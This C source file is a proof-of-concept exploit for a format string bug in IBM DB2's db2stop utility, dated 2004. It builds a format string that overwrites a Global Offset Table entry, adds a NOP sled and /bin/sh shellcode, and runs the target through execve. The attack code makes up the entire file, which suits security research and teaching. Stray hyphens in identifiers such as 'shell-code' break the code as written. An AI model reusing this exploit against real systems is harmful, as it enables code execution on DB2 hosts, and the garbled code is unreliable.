#include <stdio.h>

unsigned short GetAddress(char *address, int lvl);
unsigned char shell-code[]="\x31\xC0\x31\xDB\xb0\x17\x90\xCD\x80\x6A\x0B\x58\x99\x52\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x54\x5B\x52\x53\x54\x59\xCD\x80\xCC\xCC\xCC\xCC";

int main(int argc, char *argv[], char *envp[])
{
        char *cmd[4];
        char cmdbuf[260]="";
        char argone[4000]="";
        char argtwo[4000]="";
        char address[200]="";
        int count = 0;
        unsigned short high = 0, low = 0;


        if(argc != 3)
        {
                printf("\n\tProof of concept for the db2stop format string bug.\n");
                printf("\n\tUsage:\n\n\t$%s /path/to/db2stop ad-dress",argv[0]);
                printf("\n\n\twhere /path/to/db2stop is the path to the binary\n");
                printf("\twhere address is the location the shellcode is likely to be found - usually around 0xBFFFFnnn");
                printf("\n\n\te.g.\n\n\t$%s /home/db2inst1/sqllib/adm/db2stop BFFFF445",argv[0]);
                printf("\n\n\tNotes: As db2stop does a setuid(getuid(0)) we can't retrieve root.\n");
                printf("\tThis exploit simply spawns a shell as the user running it.\n");
                printf("\tIt works by overwriting the entry for a func-tion in the Global Offset Table\n");
                printf("\tthat's called immediately after the vulnerable printf() call.\n");
                printf("\n\n\tDavid Litchfield\n\t25th August 2004\n\t(davidl@ngssoftware.com)\n\n");
                return 0;
        }

        strncpy(cmdbuf,argv[1],256);
        strncpy(address,argv[2],196);

        // Get the location of where the second arg will be found
        // 0xBFFFF445 works on my SuSE 8.1 box

        high = GetAddress(address,0);
        low  = GetAddress(address,4);

        if(high == 0 || low == 0)
                return printf("Invalid address specified: %s\n",address);


        high = high - 35;
        low = low - high - 35;

        // Set the format string. Overwrite the entry in the Global Off-set Table for
        // _Z18sqlex_aud_rec_funccmmsP16SQLEX_AUD_DATA_TPmP5sqlca()

        sprintf(argone,"QQ\xCE\x5D\x05\x08\xCC\x5D\x05\x08ZZZDDDDEEE%%%.5dx%%20$hn%%%.5dx%%21$hn",high,low);

        // create a nop sled
        while(count < 22)
        {
                strcat(argtwo,"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90");
                count ++;
        }

        // append the shellcode
        strcat(argtwo,shellcode);

        // set params for execve
        cmd[0] = (char *) &cmdbuf;
        cmd[1] = (char *)&argone;
        cmd[2] = (char *)&argtwo;
        cmd[3] = (char *)NULL;

        // execute db2stop
        execve(cmd[0],cmd,envp);
        return 0;
}


unsigned short GetAddress(char *address, int lvl)
{
        char A = 0, B = 0, C = 0, D = 0;
        unsigned short result = 0;
        int len = 0;
        len = strlen(address);
        if(len !=8)
                return 0;
        if(lvl)
                if(lvl !=4)
                        return 0;
        A = (char)toupper((int)address[0+lvl]);
        B = (char)toupper((int)address[1+lvl]);
        C = (char)toupper((int)address[2+lvl]);
        D = (char)toupper((int)address[3+lvl]);

        if(A < 0x30)
                return 0;
        if(A < 0x40)
                A = A - 0x30;
        else
        {
                if(A > 0x46 || A < 41)
                        return 0;
                else
                        A = A - 0x37;
        }
        if(B < 0x30)
                return 0;
        if(B < 0x40)
                B = B - 0x30;
        else
        {
                if(B > 0x46 || B < 41)
                        return 0;
                else
                        B = B - 0x37;
        }
        if(C < 0x30)
                return 0;
        if(C < 0x40)
                C = C - 0x30;
        else
        {
                if(C > 0x46 || C < 41)
                        return 0;
                else
                        C = C - 0x37;
        }
        if(D < 0x30)
                return 0;
        if(D < 0x40)
                D = D - 0x30;
        else
        {
                if(D > 0x46 || D < 41)
                        return 0;
                else
                        D = D - 0x37;
        }



        result = (A * 0x10 + B) << 8;
        result = result + (C * 0x10 + D);
        return result;

}
